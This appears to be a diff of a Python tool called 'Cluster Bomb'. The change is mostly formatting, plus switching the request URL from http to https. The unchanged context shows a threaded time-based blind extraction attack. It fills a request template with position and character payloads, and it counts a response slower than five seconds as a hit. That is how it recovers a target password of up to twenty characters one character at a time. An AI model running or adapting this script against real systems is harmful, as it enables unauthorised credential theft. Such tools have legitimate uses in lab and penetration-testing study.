@@ -28,12 +28,14 @@ def parse_request(request):
             if body == '':
                 body = None
         except:
-            pass # no body
+            pass  # no body
 
         try:
-            url = 'http://' + headers['Host'] + endpoint
-        except KeyError: raise KeyError('missing Host header')
+            url = 'https://' + headers['Host'] + endpoint
+        except KeyError:
+            raise KeyError('missing Host header')
     return method, url, headers, body
+
 
 def decide(template):
     method, url, headers, body = parse_request(template)
@@ -49,9 +51,9 @@ def decide(template):
     response.raise_for_status()
 
     return end - start > 5
-    
-  
-def send_req(attempt): 
+
+
+def send_req(attempt):
     """ tuple representing the current cluster_bomb payload.
     all tests for responses should be implemented inside the decide function."""
 
@@ -61,26 +63,27 @@ def send_req(attempt):
         with password_lock:
             password[(attempt[0] - 1)] = attempt[1]
         print(f"[+] {attempt[0]}, {attempt[1]}: SUCCESS")
-    
+
 
 chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Cluster Bomb')
-    parser.add_argument('request_file', type=str, help='Path to text file containing the request template. replace parameter 0 and 1 with CLUSTER0 and CLUSTER1 respectively.')
+    parser.add_argument('request_file', type=str,
+                        help='Path to text file containing the request template. replace parameter 0 and 1 with CLUSTER0 and CLUSTER1 respectively.')
     args = parser.parse_args()
 
     global request_template
     with open(args.request_file, 'r') as f:
         request_template = f.read()
-    
+
     global password
     password = {}
     global lst
     lst = range(21)
 
     password_lock = threading.Lock()
-    
+
     payload = []
     for i in range(1, 21):
         payload = [(i, char) for char in chars]
